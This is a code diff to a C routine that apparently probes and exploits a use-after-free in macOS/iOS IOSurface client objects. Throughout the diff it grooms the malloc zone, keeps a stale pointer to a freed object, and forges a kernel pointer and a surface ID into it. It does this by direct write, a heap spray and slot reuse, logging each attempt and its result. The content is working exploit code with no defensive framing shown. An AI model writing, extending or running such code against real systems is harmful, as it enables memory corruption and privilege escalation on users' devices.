@@ -15988,60 +15988,136 @@ static void r377_probe(void) {
     uint8_t saved[448];
     memcpy(saved, raw_a, 448);
 
+    /* Pre-heat: fill and drain the 448-byte zone to prime the free list */
+    malloc_zone_t *zone = malloc_default_zone();
+    #define R377_PREHEAT 128
+    #define R377_SPRAY 128
+    void *preheat[R377_PREHEAT];
+    for (int i = 0; i < R377_PREHEAT; i++)
+        preheat[i] = malloc_zone_malloc(zone, 448);
+    for (int i = 0; i < R377_PREHEAT; i++)
+        malloc_zone_free(zone, preheat[i]);
+    rlog("  Pre-heated zone with %d alloc/free cycles\n", R377_PREHEAT);
+
+    /* Check stale pointer before free */
+    uint64_t pre_free_88;
+    memcpy(&pre_free_88, raw_a + 88, 8);
+    rlog("  Before free: +88=0x%llx (A's kptr)\n", (unsigned long long)pre_free_88);
+
     clRelease(cl_a);
     CFRelease(surf_a);
     surf_a = NULL;
     cl_a = NULL;
 
+    /* Check stale pointer after free, before spray */
+    uint64_t post_free_88;
+    memcpy(&post_free_88, raw_a + 88, 8);
+    rlog("  After free: +88=0x%llx (freed? %s)\n",
+        (unsigned long long)post_free_88,
+        post_free_88 != pre_free_88 ? "YES-changed" : "NO-same");
+
     /* Forge: +88 → C's kptr, +136 → B's sid */
     memcpy(saved + 88, &kptr_c, 8);
     memcpy(saved + 136, &sid_b, 4);
 
-    /* Larger spray for reliability */
-    malloc_zone_t *zone = malloc_default_zone();
-    #define R377_SPRAY 64
-    uint8_t *spray[R377_SPRAY] = {0};
-    for (int i = 0; i < R377_SPRAY; i++) {
-        spray[i] = (uint8_t*)malloc_zone_malloc(zone, 448);
-        memcpy(spray[i], saved, 448);
+    /* Try direct write to stale pointer first (if memory still mapped) */
+    int spray_ok = 0;
+    if (post_free_88 == 0 || post_free_88 != pre_free_88) {
+        rlog("  Attempting direct write to stale ptr...\n");
+        memcpy(raw_a, saved, 448);
+        uint64_t check88;
+        memcpy(&check88, raw_a + 88, 8);
+        if (check88 == kptr_c) {
+            spray_ok = 1;
+            rlog("  Direct write succeeded!\n");
+        } else {
+            rlog("  Direct write failed (read back 0x%llx)\n",
+                (unsigned long long)check88);
+        }
     }
 
-    uint64_t check88;
-    uint32_t check136;
-    memcpy(&check88, raw_a + 88, 8);
-    memcpy(&check136, raw_a + 136, 4);
-    rlog("  Stale +88=0x%llx (expect C's 0x%llx)\n",
-        (unsigned long long)check88, (unsigned long long)kptr_c);
-    rlog("  Stale +136=%u (expect B's %u)\n", check136, sid_b);
-
-    int spray_ok = (check88 == kptr_c && check136 == sid_b);
-    rlog("  Spray: %s\n", spray_ok ? "HIT" : "MISS");
-
-    /* Fallback: natural reuse via new surface creation */
+    /* Spray if direct write failed */
+    uint8_t *spray[R377_SPRAY] = {0};
     if (!spray_ok) {
-        rlog("  Trying natural reuse...\n");
-        IOSurfaceRef surf_reuse = IOSurfaceCreate(crprops);
-        if (surf_reuse) {
-            uint32_t rid = IOSurfaceGetID(surf_reuse);
-            IOSurfaceClientRef rcl = clLookup(rid);
-            rlog("    reuse cl=%p old_cl_a=%p same=%s\n",
-                rcl, raw_a, (void*)rcl == (void*)raw_a ? "YES" : "NO");
-            if ((void*)rcl == (void*)raw_a) {
-                uint8_t *rr = (uint8_t*)rcl;
-                memcpy(rr + 88, &kptr_c, 8);
-                memcpy(rr + 136, &sid_b, 4);
-                memcpy(&check88, rr + 88, 8);
-                memcpy(&check136, rr + 136, 4);
-                spray_ok = (check88 == kptr_c && check136 == sid_b);
-                rlog("    Overwrote reuse: spray_ok=%d\n", spray_ok);
+        rlog("  Spraying %d × 448 bytes...\n", R377_SPRAY);
+        for (int i = 0; i < R377_SPRAY; i++) {
+            spray[i] = (uint8_t*)malloc_zone_malloc(zone, 448);
+            memcpy(spray[i], saved, 448);
+        }
+
+        uint64_t check88;
+        uint32_t check136;
+        memcpy(&check88, raw_a + 88, 8);
+        memcpy(&check136, raw_a + 136, 4);
+        rlog("  Stale +88=0x%llx (expect C's 0x%llx)\n",
+            (unsigned long long)check88, (unsigned long long)kptr_c);
+        rlog("  Stale +136=%u (expect B's %u)\n", check136, sid_b);
+        spray_ok = (check88 == kptr_c && check136 == sid_b);
+        rlog("  Spray: %s\n", spray_ok ? "HIT" : "MISS");
+
+        /* Check which spray block is closest to the stale pointer */
+        if (!spray_ok) {
+            int closest = -1;
+            ptrdiff_t min_dist = PTRDIFF_MAX;
+            for (int i = 0; i < R377_SPRAY; i++) {
+                ptrdiff_t d = (uint8_t*)raw_a - spray[i];
+                if (d < 0) d = -d;
+                if (d < min_dist) { min_dist = d; closest = i; }
             }
-            if (rcl) clRelease(rcl);
-            CFRelease(surf_reuse);
+            rlog("  Closest spray[%d]=%p dist=%td from stale=%p\n",
+                closest, spray[closest], min_dist, raw_a);
+        }
+    }
+
+    /* Fallback: natural reuse */
+    if (!spray_ok) {
+        rlog("  Trying natural reuse (10 surfaces)...\n");
+        IOSurfaceRef reuse_surfs[10] = {0};
+        IOSurfaceClientRef reuse_cls[10] = {0};
+        for (int i = 0; i < 10; i++) {
+            reuse_surfs[i] = IOSurfaceCreate(crprops);
+            if (reuse_surfs[i]) {
+                uint32_t rid = IOSurfaceGetID(reuse_surfs[i]);
+                reuse_cls[i] = clLookup(rid);
+                if ((void*)reuse_cls[i] == (void*)raw_a) {
+                    rlog("    reuse[%d] cl=%p == stale!\n", i, reuse_cls[i]);
+                    uint8_t *rr = (uint8_t*)reuse_cls[i];
+                    memcpy(rr + 88, &kptr_c, 8);
+                    memcpy(rr + 136, &sid_b, 4);
+                    spray_ok = 1;
+                    rlog("    Overwrote with forged data\n");
+                }
+            }
+        }
+        if (!spray_ok) {
+            rlog("    None reused stale address. Addresses:\n");
+            for (int i = 0; i < 10; i++)
+                if (reuse_cls[i])
+                    rlog("      [%d] %p (delta=%td)\n",
+                        i, reuse_cls[i], (uint8_t*)reuse_cls[i] - (uint8_t*)raw_a);
+        }
+        for (int i = 0; i < 10; i++) {
+            if (reuse_cls[i]) clRelease(reuse_cls[i]);
+            if (reuse_surfs[i]) CFRelease(reuse_surfs[i]);
         }
     }
 
     if (!spray_ok) {
-        rlog("  Both spray and reuse failed\n");
+        rlog("  All approaches failed — dumping stale memory:\n");
+        for (int off = 0; off < 192; off += 8) {
+            uint64_t v;
+            memcpy(&v, raw_a + off, 8);
+            if (v != 0) rlog("    +%d: 0x%llx\n", off, (unsigned long long)v);
+        }
+        if (1) {
+            uint64_t allzero = 0;
+            for (int off = 0; off < 448; off += 8) {
+                uint64_t v;
+                memcpy(&v, raw_a + off, 8);
+                if (v != 0) { allzero = 1; break; }
+            }
+            rlog("  Stale memory %s\n", allzero ? "has non-zero data" : "ALL ZEROS");
+        }
         goto r377_cleanup;
     }
 
